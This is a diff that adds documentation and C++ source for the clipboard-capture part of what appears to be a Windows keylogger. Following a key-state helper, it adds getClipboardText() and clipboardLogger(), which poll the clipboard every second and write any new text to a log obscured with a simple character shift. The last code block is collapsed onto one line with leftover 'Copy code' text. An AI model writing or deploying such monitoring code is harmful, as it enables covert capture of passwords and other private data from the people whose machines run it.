@@ -75,3 +75,54 @@ bool isShift() {
 	return (GetKeyState(VK_SHIFT) & 0x8000) != 0; 
 }
 ```
+
+### Clipboard Monitoring
+
+The clipboard monitoring functionality is designed to capture and log text data from the system clipboard periodically. This process involves checking the clipboard contents at regular intervals and logging any changes. Here’s a detailed explanation of how the clipboard monitoring is implemented:
+
+#### Function: `getClipboardText()`
+
+The `getClipboardText` function retrieves the text currently stored in the system clipboard. It utilizes the Windows API to access the clipboard and fetches any Unicode text available.
+
+- **Opening the Clipboard**: The function begins by calling `OpenClipboard(nullptr)`. This function attempts to open the clipboard for examination and prevents other applications from modifying it until it is closed.
+- **Fetching Data**: The function uses `GetClipboardData(CF_UNICODETEXT)` to retrieve the handle to the clipboard data in Unicode text format. If no text is available, it returns an empty string.
+- **Converting Data**: If data is present, the function locks the global memory to access the text using `GlobalLock(hData)`, converting the wide character string (`wstring`) to a standard string (`string`).
+- **Closing the Clipboard**: After retrieving the text, the function releases the global memory lock using `GlobalUnlock(hData)` and closes the clipboard using `CloseClipboard()`.
+
+```c++
+string getClipboardText() {
+    string text = "";
+
+    if (!OpenClipboard(nullptr)) {
+        return text;
+    }
+
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData != nullptr) {
+        wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
+        if (pwszText != nullptr) {
+            wstring ws(pwszText);
+            text = string(ws.begin(), ws.end());
+            GlobalUnlock(hData);
+        }
+    }
+    CloseClipboard();
+
+    return text;
+}
+```
+
+
+#### Function: `clipboardLogger(int key, atomic<bool>& running)`
+
+The `clipboardLogger` function is responsible for periodically checking the clipboard for new content and logging it using an encryption mechanism.
+
+- **Periodic Check**: It continuously runs in a loop controlled by an atomic boolean `running`. It sleeps for 1 second (`Sleep(1000)`) between checks to minimize system resource usage.
+- **Detecting Changes**: It compares the current clipboard content with the previously logged content. If there is new content that differs from what was previously stored, it logs this content.
+- **Logging and Encryption**: New clipboard content is logged by calling the `save` function, which encrypts the content using a simple character shift.
+
+cpp
+
+Copy code
+
+`void clipboardLogger(int key, atomic<bool>& running) {     string previousClipboardContent;      while (running) {         try {             Sleep(1000);              string currentClipboardContent = getClipboardText();              if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {                 save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);                 previousClipboardContent = currentClipboardContent;             }         } catch (const exception& e) {             cerr << "Clipboard error: " << e.what() << endl;         }     } }`
